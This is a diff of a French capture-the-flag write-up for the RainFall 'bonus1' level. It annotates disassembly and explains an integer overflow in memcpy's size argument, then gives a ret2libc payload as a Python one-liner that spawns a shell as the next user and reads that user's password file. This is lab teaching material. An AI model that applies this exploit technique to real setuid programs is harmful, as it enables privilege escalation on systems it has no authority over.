@@ -52,10 +52,10 @@ Dump of assembler code for function main:
    0x08048460 <+60>:	mov    (%eax),%eax                 -    le contenu à cette adresse "BBBB" est récupéré à son tour
    0x08048462 <+62>:	mov    %eax,%edx                   -    puis stocké dans le regidtre EDX
    0x08048464 <+64>:	lea    0x14(%esp),%eax             -    
-   0x08048468 <+68>:	mov    %ecx,0x8(%esp)              -    on retrouve ici ECX notre 1er argument (x4) 
-   0x0804846c <+72>:	mov    %edx,0x4(%esp)              -    EDX notre 2eme argument
-   0x08048470 <+76>:	mov    %eax,(%esp)                 -    EAX, tout les trois push en paramètres de la fonction memcpy()
-   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>      -    tout les trois push en paramètres à la fonction memcpy()
+   0x08048468 <+68>:	mov    %ecx,0x8(%esp)              -    ECX -> size_t n         -> 1er arg x4
+   0x0804846c <+72>:	mov    %edx,0x4(%esp)              -    EDX -> const void *src  -> 2eme arg 
+   0x08048470 <+76>:	mov    %eax,(%esp)                 -    EAX -> void *dest
+   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>      -    void *memcpy(void *dest, const void *src, size_t n);
    
    -----------------------------------------------------------------------------------------------------------------------------------------------------------------
    
@@ -78,7 +78,7 @@ Après étude du <main> on déduis que notre 1er arg (x4) definit le nombre de c
 
 
 Si nous parvenons à faire en sorte que la valeur de notre 1er arg (x4) soit plus grand que celle du buffer, un deuxiéme argument bien agencé pourrait nous
-un bufferoverflow 
+permettre un bufferoverflow.
 
 0x0804842a <+6>:	sub    $0x40,%esp
 
@@ -97,6 +97,7 @@ again at the minimum value.
 
 -2147483648 * 4 = 0
 (-2147483648 + 1) * 4 = 4
+(-2147483648 + 5) * 4 = 20
 
 On a donc :
 (-2147483648 + n) * 4 = n * 4
@@ -104,21 +105,22 @@ On a donc :
 On déduis :
 (-2147483648 + 20) * 4 = 80
 
-On a alors noter 1er arg = -2147483628  ce qui nous permettra de copier 80 caractères (nous prenons 80 ++large que 64 par précaution) 
+On a alors 1er arg = -2147483628  ce qui nous permettra de copier 80 caractères, de quoi bien dépasser notre buffer.
 
 Determinons l'offset de notre notre buffer : (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
 On trouve OFFSET -- > 56
 
-Nous allons pouvoir monter notre exploit pour ce faire il nous faut
+Nous allons pouvoir monter notre exploit returntolibc pour ce faire il nous faut :
+
 - 1er arg qui nous permettent de copier assez de caractère pour overflow le buffer      --> -2147483628
 - OFFSET                                                                                --> 56
 - l'adresse de system()   ---> (gdb) p system                                           --> 0xb7e6b060
-- l'adresse de exit()     --->
+- l'adresse de exit()     ---> (gdb) p exit                                             --> 0xb7e5ebe0
 - l'adresse de "/bin/sh" que nous avons deja dans le disas                              --> 0x8048583
 
 Ce qui nous donne l'exploit suivante :
 
->$ bonus1@RainFall:~$ ./bonus1 -2147483628 $(python -c 'print("A" * 56 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\x57" + "\x83\x85\x04\x08")')
+>$ bonus1@RainFall:~$ ./bonus1 -2147483628 $(python -c 'print("A" * 56 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x83\x85\x04\x08")')
   $ whoami
   bonus2
   $ cat /home/user/bonus2/.pass
